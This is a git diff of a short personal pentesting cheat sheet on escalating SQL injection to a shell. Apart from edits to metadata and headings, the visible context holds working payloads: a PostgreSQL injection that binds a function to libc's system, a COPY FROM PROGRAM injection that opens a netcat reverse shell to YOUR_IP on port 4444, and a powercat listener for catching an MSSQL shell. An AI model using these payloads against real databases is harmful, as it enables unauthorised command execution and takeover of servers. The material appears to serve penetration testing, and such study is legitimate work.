@@ -1,12 +1,11 @@
 # sql
 
-**Author:** Julien Bongars\
-**Date:** 2025-09-20 17:19:28
-**Path:**
+Author: Julien Bongars
+Date: 2025-09-20 17:19:28
 
 ---
 
-SQL injection to a shell: write a webshell, `sys_exec` / `COPY PROGRAM`, or `xp_cmdshell`.
+Reverse shell for SQL commands
 
 ## MySQL
 
@@ -29,6 +28,8 @@ sql'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6'
 # use the program arg
 ' UNION SELECT 1; COPY (SELECT '') FROM PROGRAM 'nc -e /bin/bash YOUR_IP 4444'; --
 ```
+
+### Additional cracks by col
 
 ## MSSQL
 
@@ -67,9 +68,3 @@ $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
 # Need to use powercat on attack machine to get shell
 powercat -l -p 4444 -e cmd
 ```
-
-## Resources
-
-- [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) — enable and run
-- [PayloadsAllTheThings — SQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) — OUTFILE / xp_cmdshell / COPY
-- [HackTricks — SQL injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html) — engine-specific RCE
